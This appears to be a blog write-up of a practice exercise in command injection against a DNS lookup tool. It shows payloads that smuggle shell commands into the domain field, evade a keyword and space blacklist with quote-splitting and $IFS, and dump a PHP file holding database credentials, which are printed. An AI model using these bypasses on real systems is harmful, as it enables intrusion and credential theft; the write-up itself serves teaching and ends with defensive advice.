---
layout: post
title: "Command Injection Practice — DNS Lookup Tool"
date: 2026-09-27 12:00:00
description: Bypassing a blacklist-based WAF on a vulnerable DNS lookup tool to achieve command injection and read source code.
tags: [writeup, command-injection, waf-bypass, linux]
categories: [Write-ups]
giscus_comments: true
related_posts: false
---

## The target

The target is a simple **DNS Lookup** web tool: the user enters a domain, and the server presumably runs a `dig`/`nslookup`-style command against it.

{% include figure.liquid path="assets/img/command-injection-practice/01-target-site.png" class="img-fluid rounded z-depth-1" %}

## First payload — blocked

A straightforward command separator payload is tried first:

```
i ; ls
```

{% include figure.liquid path="assets/img/command-injection-practice/02-payload-blocked.png" class="img-fluid rounded z-depth-1" %}

The payload is flagged by the server: **"Error: Command contains blacklisted keyword."**

## Confirming the `;` separator works

Before assuming `;` itself is blacklisted, a more innocuous payload is sent:

```
ok.com;
```

{% include figure.liquid path="assets/img/command-injection-practice/03-semicolon-result.png" class="img-fluid rounded z-depth-1" %}

This works and returns a normal DNS lookup for `ok.com`. This confirms that the `;` character itself is **not** flagged — it's whatever command follows it (like `ls`) that triggers the blacklist.

## Listing the working directory

Trying the full command `test.com;'ls'` (with quotes split around characters to dodge simple string matching) succeeds and returns a directory listing containing `assets`, `database.php`, and `index.php`.

Testing a `cat database.php` style payload built the same way — splitting characters with empty quotes to break up blacklisted substrings — gets flagged. Blacklist-evasion iterations follow:

- `;'ca''t' 'database''.php'` → still flagged (space between `cat` and the filename is the issue)
- `;'l''s'` (with a trailing space) → **succeeds**, confirming a raw **space character** is blacklisted, not just keyword substrings

{% include figure.liquid path="assets/img/command-injection-practice/04-ls-space-success.png" class="img-fluid rounded z-depth-1" %}

## Bypassing the space filter with `$IFS`

Since spaces are blacklisted, the shell's `$IFS` (Internal Field Separator) variable is used instead — it expands to whitespace (tab/newline) and is treated by the shell exactly like a space, without containing a literal space character in the payload:

```
;'ca''t'$IFS'database''.php'
```

{% include figure.liquid path="assets/img/command-injection-practice/05-ifs-blocked.png" class="img-fluid rounded z-depth-1" %}

This particular obfuscated variant is still caught by the filter. Several close variants are tried (with/without extra quote-splitting, with/without the leading `;`), until one combination gets through and the source of `database.php` is dumped:

{% include figure.liquid path="assets/img/command-injection-practice/06-database-php-leak.png" class="img-fluid rounded z-depth-1" %}

```php
try{
  $host = 'localhost';
  $db_name = 'hv_database';
  $charset = 'utf8';
  $username = 'root';
  $password = 'DWG8kxJJjyquXd';

  $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset", $username, $password);
} catch(PDOException $e){

}
?>
```

The database credentials (`root` / `DWG8kxJJjyquXd`) are leaked directly from the PHP source, opening the door to further enumeration of the database itself.

## Key takeaways

- A blacklist filter that only checks for specific **keywords** (`ls`, `cat`, etc.) is trivially bypassed by splitting the command string with empty quotes (`'ca''t'`), which the shell reassembles at execution time.
- A filter that also blocks the literal **space character** can still be bypassed with `$IFS`, since it achieves the same word-separation effect without containing a space.
- Blacklisting is fundamentally fragile compared to a strict **whitelist** of allowed characters, or — better — never passing user input to a shell command at all.
